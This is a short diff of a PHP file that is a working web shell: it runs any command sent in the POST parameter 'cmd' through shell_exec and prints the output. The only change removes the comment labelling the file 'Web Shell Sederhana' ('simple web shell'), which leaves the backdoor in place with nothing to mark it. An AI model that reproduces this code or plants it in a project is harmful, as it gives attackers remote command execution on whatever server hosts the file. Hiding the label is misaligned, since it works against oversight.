@@ -1,5 +1,4 @@
 <?php
-// Web Shell Sederhana
 if (isset($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
     echo "<pre>" . shell_exec($cmd) . "</pre>";
